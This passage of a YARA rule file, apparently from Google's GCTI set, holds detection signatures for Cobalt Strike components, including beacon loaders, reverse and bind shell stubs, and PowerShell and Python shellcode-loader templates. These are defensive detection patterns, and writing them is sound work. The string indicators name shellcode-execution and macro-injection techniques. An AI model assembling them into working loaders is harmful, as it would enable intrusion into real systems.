		hash = "e0683f953062e63b2aabad7bc6d76a78748504b114329ef8e2ece808b3294135"
		logic_hash = "c9df0e287eb0eacf7c6cfcf3f6d1043ae6f2fdacd3b22bd42ac71f4b0d7226ff"
		score = 75
		quality = 83
		tags = ""

	strings:
		$ea = "Excel.Application" nocase
		$vis = "Visible = False" nocase
		$wsc = "Wscript.Shell" nocase
		$regkey1 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" nocase
		$regkey2 = "\\Excel\\Security\\AccessVBOM" nocase
		$regwrite = ".RegWrite" nocase
		$dw = "REG_DWORD"
		$code = ".CodeModule.AddFromString"
		$ao = { 41 75 74 6f 5f 4f 70 65 6e }
		$da = ".DisplayAlerts"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Browserpivot_X64_Bin_V1_48_To_V3_14_And_Sleeve_Browserpivot_X64_Dll_V4_0_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/browserpivot.x64.bin from v1.48 to v3.14 and sleeve/browserpivot.x64.dll from v4.0 to at least v4.4"
		author = "gssincla@google.com"
		id = "a5dfae85-ff9c-5ca5-9ac0-041c6108a6ed"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Browserpivot_x64_Bin_v1_48_to_v3_14_and_Sleeve_Browserpivot_x64_Dll_v4_0_to_v4_x.yara#L17-L64"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "0ad32bc4fbf3189e897805cec0acd68326d9c6f714c543bafb9bc40f7ac63f55"
		logic_hash = "a59f19b6e258b724ed88b4255717d066319ba5fb0838d6c6ed11355e9d9b1c22"
		score = 75
		quality = 85
		tags = ""

	strings:
		$socket_recv = {
			FF 15 [4]
			83 ?? FF
			74 ??
			85 ??
			74 ??
			03 ??
			83 ?? 02
			72 ??
			8D ?? FF
			80 [2] 0A
			75 ??
			8D ?? FE
			80 [2] 0D
		}
		$fmt = "%1024[^ ] %8[^:]://%1016[^/]%7168[^ ] %1024[^ ]"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Bind_Bin_V2_5_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/bind.bin signature for versions 2.5 to 4.x"
		author = "gssincla@google.com"
		id = "32f129c1-9845-5843-9e16-7d9af217b8e2"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Bind_Bin_v2_5_through_v4_x.yara#L17-L111"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "3727542c0e3c2bf35cacc9e023d1b2d4a1e9e86ee5c62ee5b66184f46ca126d1"
		logic_hash = "cf04e257590cf0673059348f5c15926918eb8aee40e864ae65979360aca80013"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			31 ?? 
			AC
			C1 ?? 0D 
			01 ?? 
			38 ?? 
			75 ?? 
			03 [2]
			3B [2]
			75 ?? 
			5? 
			8B ?? 24 
			01 ?? 
			66 8B [2]
			8B ?? 1C 
			01 ?? 
			8B ?? 8B 
			01 ?? 
			89 [3]
			5? 
			5? 
		}
		$ws2_32 = {
			5D
			68 33 32 00 00
			68 77 73 32 5F
		}
		$listenaccept = {
			5? 
			5? 
			68 B7 E9 38 FF
			FF ?? 
			5? 
			5? 
			5? 
			68 74 EC 3B E1
		}

	condition:
		$apiLocator and $ws2_32 and $listenaccept
}

rule GCTI_Cobaltstrike_Resources_Covertvpn_Dll_V2_1_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/covertvpn.dll signature for version v2.2 to v4.4"
		author = "gssincla@google.com"
		id = "a65b855c-5703-5b9f-bb57-da8ebf898f9b"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Covertvpn_Dll_v2_1_to_v4_x.yara#L17-L120"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "0a452a94d53e54b1df6ba02bc2f02e06d57153aad111171a94ec65c910d22dcf"
		logic_hash = "1f6e4254fdfd4f9b13c2000333aabbb7da90d2df7ee1b12faa6ea3c066351468"
		score = 75
		quality = 85
		tags = ""

	strings:
		$dropComponentsAndActivateDriver_prologue = {
			5? 
			68 [4]
			68 [4]
			C7 [3-5] 00 00 00 00 
			FF 15 [4]
			50
			FF 15 [4]
			8B ?? 
			85 ?? 
			74 ??
			8D [3-5]
			5? 
			FF 15 [4]
			50
		}
		$dropFile = {
			6A 00
			5? 
			E8 [4]
			83 C4 08
			83 F8 FF
			74 ?? 
			5? 
			[0-5]
			E8 [4]
			83 C4 ??
			[0-2]
			6A 00
			68 80 01 00 00
			6A 02
			6A 00
			6A 05
			68 00 00 00 40
			5? 
			FF 15 [4]
			8B ?? 
			83 ?? FF 
			75 ?? 
			FF 15 [4]
			5? 
		}
		$nfp = "npf.sys" nocase
		$wpcap = "wpcap.dll" nocase

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Reverse64_Bin_V2_5_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/reverse64.bin signature for versions v2.5 to v4.x"
		author = "gssincla@google.com"
		id = "966e6e4c-85e2-5c94-8245-25367802b7d2"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Reverse64_Bin_v2_5_through_v4_x.yara#L17-L99"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "d2958138c1b7ef681a63865ec4a57b0c75cc76896bf87b21c415b7ec860397e8"
		logic_hash = "c657234156293b9ac363b677490739ab0b5cc2ef149c9d9c37332dab9bb012f6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			48 [2]
			AC
			41 [2] 0D
			41 [2]
			38 ??
			75 ??
			4C [4]
			45 [2]
			75 ??
			5?
			44 [2] 24
			49 [2]
			66 [4]
			44 [2] 1C
			49 [2]
			41 [3]
			48 
		}
		$calls = {
			48 89 C1
			41 BA EA 0F DF E0
			FF D5
			48 [2]
			6A ??
			41 ??
			4C [2]
			48 [2]
			41 BA 99 A5 74 61
			FF D5
		}

	condition:
		$apiLocator and $calls
}

rule GCTI_Cobaltstrike_Resources_Xor_Bin_V2_X_To_V4_X
{
	meta:
		description = "Cobalt Strike's resource/xor.bin signature for version 2.x through 4.x"
		author = "gssincla@google.com"
		id = "1754746c-3a42-5f7d-808a-ba2e1c0a270e"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Xor_Bin__32bit_v2_x_to_4_x.yara#L17-L36"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "211ccc5d28b480760ec997ed88ab2fbc5c19420a3d34c1df7991e65642638a6f"
		logic_hash = "ad662a263ede6c3ba964baf8abe4848ed1e994f2c236d4315cb60c1d51442620"
		score = 75
		quality = 85
		tags = ""

	strings:
		$stub52 = {fc e8 ?? ?? ?? ?? [1-32] eb 27 5? 8b ??    83 c? ?4 8b ??    31 ?? 83 c? ?4 5? 8b ??    31 ?? 89 ??    31 ?? 83 c? ?4 83 e? ?4 31 ?? 39 ?? 74 ?2 eb ea 5? ff e? e8 d4 ff ff ff}
		$stub56 = {fc e8 ?? ?? ?? ?? [1-32] eb 2b 5d 8b ?? ?? 83 c5 ?4 8b ?? ?? 31 ?? 83 c5 ?4 55 8b ?? ?? 31 ?? 89 ?? ?? 31 ?? 83 c5 ?4 83 e? ?4 31 ?? 39 ?? 74 ?2 eb e8 5? ff e? e8 d? ff ff ff}

	condition:
		any of them
}

rule GCTI_Cobaltstrike_Resources_Template_Py_V3_3_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/template.py signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "16aef9a9-b217-5462-93dc-f6273c99ddd0"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Py_v3_3_to_v4_x.yara#L17-L36"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "d5cb406bee013f51d876da44378c0a89b7b3b800d018527334ea0c5793ea4006"
		logic_hash = "3c26cea4b8f2b200bf58e939ae9ead7a7339d4ec0de8c72b3d9c7da897600081"
		score = 75
		quality = 85
		tags = ""

	strings:
		$arch = "platform.architecture()"
		$nope = "WindowsPE"
		$alloc = "ctypes.windll.kernel32.VirtualAlloc"
		$movemem = "ctypes.windll.kernel32.RtlMoveMemory"
		$thread = "ctypes.windll.kernel32.CreateThread"
		$wait = "ctypes.windll.kernel32.WaitForSingleObject"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Reverse_Bin_V2_5_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/reverse.bin signature for versions 2.5 to 4.x"
		author = "gssincla@google.com"
		id = "182dbcd0-1180-5516-abe3-cf2eebbd0e39"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Reverse_Bin_v2_5_through_v4_x.yara#L17-L104"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "887f666d6473058e1641c3ce1dd96e47189a59c3b0b85c8b8fccdd41b84000c7"
		logic_hash = "c6c4fc477c7654ec07eb6ef4c6d53805a9b4881ba288754e1f50b3e4b134333c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			31 ?? 
			AC
			C1 ?? 0D 
			01 ?? 
			38 ?? 
			75 ?? 
			03 [2]
			3B [2]
			75 ?? 
			5? 
			8B ?? 24 
			01 ?? 
			66 8B [2]
			8B ?? 1C 
			01 ?? 
			8B ?? 8B 
			01 ?? 
			89 [3]
			5? 
			5? 
		}
		$ws2_32 = {
			5D
			68 33 32 00 00
			68 77 73 32 5F
		}
		$connect = {
			6A 10
			5? 
			5? 
			68 99 A5 74 61
		}

	condition:
		$apiLocator and $ws2_32 and $connect
}

rule GCTI_Cobaltstrike_Resources_Artifact64_V1_49_V2_X_V3_0_V3_3_Thru_V3_14
{
	meta:
		description = "Cobalt Strike's resources/artifact64{.dll,.exe,big.exe,big.dll,bigsvc.exe,big.x64.dll} and resources/rtifactuac(alt)64.dll signature for versions v1.49, v2.x, v3.0, and v3.3 through v3.14"
		author = "gssincla@google.com"
		id = "67902782-500e-5a89-8b2a-59ee21bcba3e"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Artifact64_v1_49_to_v4_x.yara#L17-L54"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "9ec57d306764517b5956b49d34a3a87d4a6b26a2bb3d0fdb993d055e0cc9920d"
		logic_hash = "289950e89fc743ff4a1b7dcb91c561c7d829cfe3ade1c2f1a09f2e9701cce461"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = { 8B [2] 48 98 48 [2] 48 [3] 8B [2] 48 98 48 [3] 44 [3] 8B [2] 89 ?? C1 ?? 1F C1 ?? 1E 01 ?? 83 ?? 03 29 ?? 48 98 48 [3] 0F B6 00 44 [2] 88 }

	condition:
		$a
}

rule GCTI_Cobaltstrike_Resources_Artifact64_V3_1_V3_2_V3_14_And_V4_0
{
	meta:
		description = "Cobalt Strike's resources/artifact64{svcbig.exe,.dll,big.dll,svc.exe} and resources/artifactuac(big)64.dll signature for versions 3.14 to 4.x and resources/artifact32svc.exe for 3.14 to 4.x"
		author = "gssincla@google.com"
		id = "c9e9b8e0-16fe-5abc-b1fe-0e3e586f6db6"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Artifact64_v1_49_to_v4_x.yara#L56-L84"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "2e7a39bd6ac270f8f548855b97c4cef2c2ce7f54c54dd4d1aa0efabeecf3ba90"
		logic_hash = "e5af04baa1d18d5a2a2c005b40bf93fe6a7b2d7116dfcf3c5b3fa36657448eb9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$decoderFunction = { 31 ?? EB 0F 41 [2] 03 47 [3] 44 [3] 48 [2] 39 ?? 41 [2] 7C EA 4C [6] E9 }

	condition:
		$decoderFunction
}

rule GCTI_Cobaltstrike_Resources_Artifact64_V3_14_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/artifact64{.exe,.dll,svc.exe,svcbig.exe,big.exe,big.dll,.x64.dll,big.x64.dll} and resource/artifactuac(alt)64.exe signature for versions v3.14 through v4.x"
		author = "gssincla@google.com"
		id = "1c7731d3-429b-57aa-9c17-8de7d0841b1e"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Artifact64_v1_49_to_v4_x.yara#L86-L128"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "decfcca0018f2cec4a200ea057c804bb357300a67c6393b097d52881527b1c44"
		logic_hash = "af8ba6ba62bf1179510b0940e60f893f61b3ba10c81001dd90fe4c3521e56a37"
		score = 75
		quality = 85
		tags = ""

	strings:
		$fmtBuilder = {
			41 ?? 5C 00 00 00
			C7 [3] 5C 00 00 00
			C7 [3] 65 00 00 00
			C7 [3] 70 00 00 00
			C7 [3] 69 00 00 00
			C7 [3] 70 00 00 00
			C7 [3] 5C 00 00 00
			C7 [3] 2E 00 00 00
			89 [3]
			48 [6]
			E8
		}
		$fmtString = "%c%c%c%c%c%c%c%c%cMSSE-%d-server"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template_X64_Ps1_V3_0_To_V4_X_Excluding_3_12_3_13
{
	meta:
		description = "Cobalt Strike's resources/template.x64.ps1, resources/template.hint.x64.ps1 and resources/template.hint.x32.ps1 from v3.0 to v4.x except 3.12 and 3.13"
		author = "gssincla@google.com"
		id = "5a808113-aacb-56ca-b3ec-166c73c54b85"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_x64_Ps1_v3_0_to_v4_x_excluding_3_12_3_13.yara#L17-L37"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ff743027a6bcc0fee02107236c1f5c96362eeb91f3a5a2e520a85294741ded87"
		logic_hash = "80823b8590004686ebd83958cad16094ea2f6958a837d87934507531a00df77a"
		score = 75
		quality = 81
		tags = ""

	strings:
		$dda = "[AppDomain]::CurrentDomain.DefineDynamicAssembly" nocase
		$imm = "InMemoryModule" nocase
		$mdt = "MyDelegateType" nocase
		$rd = "New-Object System.Reflection.AssemblyName('ReflectedDelegate')" nocase
		$data = "[Byte[]]$var_code = [System.Convert]::FromBase64String(" nocase
		$64bitSpecific = "[IntPtr]::size -eq 8"
		$mandatory = "Mandatory = $True"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template__X32_X64_Ps1_V1_45_To_V2_5_And_V3_11_To_V3_14
{
	meta:
		description = "Cobalt Strike's resources/template.x64.ps1, resources/template.x32 from v3.11 to v3.14 and resources/template.ps1 from v1.45 to v2.5 "
		author = "gssincla@google.com"
		id = "c9fa6a39-0098-5dde-9762-94bc6b2df299"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template__x32_x64_Ps1_v1_45_to_v2_5_and_v3_11_to_v3_14.yara#L17-L43"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ff743027a6bcc0fee02107236c1f5c96362eeb91f3a5a2e520a85294741ded87"
		logic_hash = "5196f111f257239d2e7e4ca342e7fc8bac1687743bc8c7ff23addf1f094b2e93"
		score = 75
		quality = 85
		tags = ""

	strings:
		$importVA = "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc" nocase
		$importCT = "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread" nocase
		$importWFSO = "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject" nocase
		$compiler = "New-Object Microsoft.CSharp.CSharpCodeProvider" nocase
		$params = "New-Object System.CodeDom.Compiler.CompilerParameters" nocase
		$paramsSys32 = ".ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))" nocase
		$paramsGIM = ".GenerateInMemory = $True" nocase
		$result = "$compiler.CompileAssemblyFromSource($params, $assembly)" nocase

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Artifact32Svc_Exe_V3_1_V3_2_V3_14_And_V4_X
{
	meta:
		description = "Cobalt Strike's resources/artifact32svc(big).exe signature for versions 3.1 and 3.2 (with overlap with v3.14 through v4.x)"
		author = "gssincla@google.com"
		id = "732169be-e334-5774-b0ac-54b217a8b681"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Artifact32svc_Exe_v1_49_to_v4_x.yara#L53-L77"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "871390255156ce35221478c7837c52d926dfd581173818620b738b4b029e6fd9"
		logic_hash = "b55211fc2dbe100edb19c3f3a000be513144e3556c4bce8a29a3c0b77451ba96"
		score = 75
		quality = 85
		tags = ""

	strings:
		$decoderFunc = { 89 ?? B? 04 00 00 00 99 F7 FF 8B [2] 8A [2] 30 }

	condition:
		$decoderFunc
}

rule GCTI_Cobaltstrike_Resources_Template_Sct_V3_3_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/template.sct signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "9d2b1dfa-5f76-503f-9198-6ed0d039e0cb"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Sct_v3_3_to_v4_x.yara#L17-L38"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
		logic_hash = "8868445ced4945c469764b7f311d6cb11c99cf0f2d770113e5e617e0187a962c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$scriptletstart = "<scriptlet>" nocase
		$registration = "<registration progid=" nocase
		$classid = "classid=" nocase
		$scriptlang = "<script language=\"vbscript\">" nocase
		$cdata = "<![CDATA["
		$scriptend = "</script>" nocase
		$antiregistration = "</registration>" nocase
		$scriptletend = "</scriptlet>"

	condition:
		all of them and @scriptletstart [ 1 ] < @registration [ 1 ] and @registration [ 1 ] < @classid [ 1 ] and @classid [ 1 ] < @scriptlang [ 1 ] and @scriptlang [ 1 ] < @cdata [ 1 ]
}

rule GCTI_Cobaltstrike_Sleeve_Beaconloader_HA_X86_O_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/BeaconLoader.HA.x86.o (HeapAlloc) Versions 4.3 through at least 4.6"
		author = "gssincla@google.com"
		id = "0ee3fa6f-367c-596f-a3bc-3bcfa61b97aa"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Sleeve_BeaconLoader_all.yara#L17-L59"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "8e4a1862aa3693f0e9011ade23ad3ba036c76ae8ccfb6585dc19ceb101507dcd"
		logic_hash = "d02257bc556d0b1675997ab6af1b28cf5f498855d6254e3c1cd7eb4a0c4d2715"
		score = 75
		quality = 85
		tags = ""

	strings:
		$core_sig = {
      C6 45 F0 48
      C6 45 F1 65
      C6 45 F2 61
      C6 45 F3 70
      C6 45 F4 41
      C6 45 F5 6C
      C6 45 F6 6C
      C6 45 F7 6F
      C6 45 F8 63
      C6 45 F9 00
    }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beaconloader_MVF_X86_O_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/BeaconLoader.MVF.x86.o (MapViewOfFile) Versions 4.3 through at least 4.6"
		author = "gssincla@google.com"
		id = "3f7c0553-989e-53e7-87a9-3fa1c47f4b62"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Sleeve_BeaconLoader_all.yara#L61-L111"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "cded3791caffbb921e2afa2de4c04546067c3148c187780066e8757e67841b44"
		logic_hash = "dd831fb01a403213c06e3d07daf3da5f56655619a686149f9d4beec2331fe6ca"
		score = 75
		quality = 85
		tags = ""

	strings:
		$core_sig = {
      C6 45 EC 4D
      C6 45 ED 61
      C6 45 EE 70
      C6 45 EF 56
      C6 45 F0 69
      C6 45 F1 65
      C6 45 F2 77
      C6 45 F3 4F
      C6 45 F4 66
      C6 45 F5 46
      C6 45 F6 69
      C6 45 F7 6C
      C6 45 F8 65
      C6 45 F9 00
    }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beaconloader_VA_X86_O_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/BeaconLoader.VA.x86.o (VirtualAlloc) Versions 4.3 through at least 4.6"
		author = "gssincla@google.com"
		id = "5f89c4be-f4c5-54d3-b923-d125de53902f"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Sleeve_BeaconLoader_all.yara#L114-L194"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "94d1b993a9d5786e0a9b44ea1c0dc27e225c9eb7960154881715c47f9af78cc1"
		logic_hash = "19b2297986bd72204fb117560cddcfb512f5db6c157d9730b5802bf9f968eef4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$core_sig = {
      C6 45 B0 56
      C6 45 B1 69
      C6 45 B2 72
      C6 45 B3 74
      C6 45 B4 75
      C6 45 B5 61
      C6 45 B6 6C
      C6 45 B7 41
      C6 45 B8 6C
      C6 45 B9 6C
      C6 45 BA 6F
      C6 45 BB 63
      C6 45 BC 00
    }
		$deobfuscator = {
      8B 4D FC
      83 C1 01
      89 4D FC
      8B 55 FC
      3B 55 0C
      73 19
      0F B6 45 10
      8B 4D 08
      03 4D FC
      0F BE 11
      33 D0
      8B 45 08
      03 45 FC
      88 10
      EB D6
    }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beaconloader_X86_O_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/BeaconLoader.x86.o Versions 4.3 through at least 4.6"
		author = "gssincla@google.com"
		id = "32a47966-f3bb-52c3-a977-82a1b09ddf2c"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Sleeve_BeaconLoader_all.yara#L196-L276"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "94d1b993a9d5786e0a9b44ea1c0dc27e225c9eb7960154881715c47f9af78cc1"
		logic_hash = "cab5441ce7d919101fc04aa469e77b71a4c444443e44c752f18cbbc5b17ed5c2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$core_sig = {
      C6 45 B0 56
      C6 45 B1 69
      C6 45 B2 72
      C6 45 B3 74
      C6 45 B4 75
      C6 45 B5 61
      C6 45 B6 6C
      C6 45 B7 41
      C6 45 B8 6C
      C6 45 B9 6C
      C6 45 BA 6F
      C6 45 BB 63
      C6 45 BC 00
    }
		$deobfuscator = {
      8B 4D FC
      83 C1 01
      89 4D FC
      8B 55 FC
      3B 55 0C
      73 19
      0F B6 45 10
      8B 4D 08
      03 4D FC
      0F BE 11
      33 D0
      8B 45 08
      03 45 FC
      88 10
      EB D6
    }

	condition:
		$core_sig and not $deobfuscator
}

rule GCTI_Cobaltstrike_Sleeve_Beaconloader_HA_X64_O_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/BeaconLoader.HA.x64.o (HeapAlloc) Versions 4.3 through at least 4.6"
		author = "gssincla@google.com"
		id = "9b16ff13-2d8e-51dc-9f99-6c45eff76feb"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Sleeve_BeaconLoader_all.yara#L281-L323"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "d64f10d5a486f0f2215774e8ab56087f32bef19ac666e96c5627c70d345a354d"
		logic_hash = "b712a0c218e473f6c64fdead22b291d7fb0bac8ba614adcf1ba6431e854a5e65"
		score = 75
		quality = 85
		tags = ""

	strings:
		$core_sig = {
      C6 44 24 38 48
      C6 44 24 39 65
      C6 44 24 3A 61
      C6 44 24 3B 70
      C6 44 24 3C 41
      C6 44 24 3D 6C
      C6 44 24 3E 6C
      C6 44 24 3F 6F
      C6 44 24 40 63
      C6 44 24 41 00
    }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beaconloader_MVF_X64_O_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/BeaconLoader.MVF.x64.o (MapViewOfFile) Versions 4.3 through at least 4.6"
		author = "gssincla@google.com"
